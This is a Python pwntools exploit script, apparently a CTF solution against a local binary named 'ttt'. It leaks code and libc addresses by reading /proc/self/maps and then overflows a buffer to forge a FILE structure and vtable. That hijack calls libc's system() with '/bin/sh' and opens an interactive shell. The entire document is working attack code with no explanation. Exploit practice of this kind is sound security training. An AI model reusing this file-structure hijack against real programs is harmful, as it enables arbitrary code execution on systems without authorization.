#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./ttt"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice :",str(idx))

def openfile(filename):
    opt(1)
    p.sendlineafter("Filename:",str(filename))

def read():
    opt(2)

def write():
    opt(3)

def ex(name):
    opt(4)
    p.sendlineafter("Leave your name :",str(name))

filename = "/proc/self/maps"
openfile(filename)
read()
write()
p.recvuntil(":")

code = int(p.recvuntil("-")[:-1],16)
log.success("code addr is ->" + hex( code ))

read()
write()
p.recvuntil("p]\n")
libc = int(p.recvuntil("-")[:-1],16)
log.success("libc addr is ->" + hex( libc ))

buf = code + 0x2020e0
log.success("buf addr is ->" + hex( buf ))

# bypass lock check
lock = buf + 0x500

raw_input(":@@")
# payload = flat([
    # "a"*0x100,buf
    # ])
# payload = flat([
    # "A"*0x88,lock
    # ]).ljust(0x100,"A") + p64(buf)

vtable = buf + 0x108

payload = flat([
    "A"*8,";/bin/sh\0;aaabbb",
    "A"*0x70,lock
    ]).ljust(0xd8,"A") + p64(vtable)

system_addr = libc+0x3c35b
log.success("system_addr addr is ->" + hex( system_addr ))
payload = payload.ljust(0x100,"A") + p64(buf)

payload += "c"*0x10 + p64(system_addr)

ex(payload)

p.interactive()
